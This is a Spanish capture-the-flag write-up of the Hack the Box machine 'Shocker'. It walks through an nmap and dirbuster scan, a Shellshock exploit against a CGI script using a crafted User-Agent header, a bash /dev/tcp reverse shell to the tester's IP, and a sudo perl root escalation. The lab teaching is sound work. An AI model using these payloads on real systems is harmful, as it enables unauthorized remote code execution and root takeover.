![image](https://user-images.githubusercontent.com/50930193/165199400-be11ac94-89bc-402f-8da2-bcec9eb7de23.png)

# Shocker (Linux)

En Hack the Box levante la máquina shocker

![image](https://user-images.githubusercontent.com/50930193/165199618-0bd695ae-d127-466e-a0b7-b20dc0994bb4.png)


### Conexión a la VPN

Dentro de hack the box ingrese a la ruta *https://www.hackthebox.com/home/htb/access* para descargar su archivo de conexión VPN y luego conéctese su kali a HTB usando el archivo que descarg+on

```
openvpn --config rberrospilast.ovpn 
```
![image](https://user-images.githubusercontent.com/50930193/165199941-84017c03-ac35-4514-87de-be14b15ff247.png)

Una vez conectado le aparecerá un mensaje similar 

![image](https://user-images.githubusercontent.com/50930193/165200041-126d0fde-d33f-4a79-95fa-6f697112fdcc.png)


### Reconocimiento

Lo primero es lo primero, ejecutamos un escaneo nmap inicial rápido para ver qué puertos están abiertos y qué servicios se están ejecutando en esos puertos
```
nmap -sS -Pn --open -p1-65535 -vvv -oN  10.129.116.67_tcp.txt  10.129.116.67 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
...
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Execution time in seconds:
	 TTL: 0
	 Furious: 19
	 Nmap: 15
	 Total: 34

```
Se tiene esta información
```
      80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
```


### Enumeración

Siempre empiezo enumerando HTTP primero (Puerto 80). Visitamos el sitio web y no encontramos nada útil.

![b21](https://user-images.githubusercontent.com/50930193/111671725-387f6400-87e7-11eb-8935-72479d307fc7.jpg)

A continuación, ejecutemos dirbuster y obtendremos el siguiente resultado
```
dirbuster
```
![image](https://user-images.githubusercontent.com/50930193/165198878-07f921d6-e4d0-40a0-bd58-9356fa4501e7.png)

![b20](https://user-images.githubusercontent.com/50930193/111671738-3ae1be00-87e7-11eb-8a21-e9cf21b76dc0.jpg)

Entonces, hemos revisado el comportamiento de este un programa cgi llamado *user.sh*, cuando ejecutamos este programa podemos descargar la respuesta de cgi y revisar su contenido.

![b22](https://user-images.githubusercontent.com/50930193/111673290-d0ca1880-87e8-11eb-9e85-aba32cba2b37.jpg)

![b24](https://user-images.githubusercontent.com/50930193/111674184-bcd2e680-87e9-11eb-96ef-622efc1d7298.jpg)

### Explotación

Aparentemente, este sitio web tiene una vulnerabilidad de Shellshock, Shellshock, también conocido como Bashdoor, es una familia de errores de seguridad en el shell Bash de Unix. Shellshock podría permitir que un atacante haga que Bash ejecute comandos arbitrarios y obtenga acceso no autorizado a muchos servicios relacionados con Internet, como servidores web, que usan Bash para procesar solicitudes. Intentemos ejecutar comandos
```
$ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://10.129.116.67/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Entonces creamos un shell inverso
```
curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.81/1234 0>&1'" http://10.129.116.67/cgi-bin/user.sh
```
![b25](https://user-images.githubusercontent.com/50930193/111733536-2254c080-8846-11eb-8a73-73ac48f90284.jpg)

Excelente obtenemos shell!!

### Escalada de Privilegios

Ejecutamos *sudo -l* para determinar qué permisos tenemos.  
```
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

Finalmente, podemos ejecutar perl como root, así que ejecutamos este comando simple y ¡tenemos root!

```
sudo /usr/bin/perl -e 'exec "/bin/sh"'
```
![b26](https://user-images.githubusercontent.com/50930193/111734337-f3d7e500-8847-11eb-96bd-47461b4ebcff.jpg)
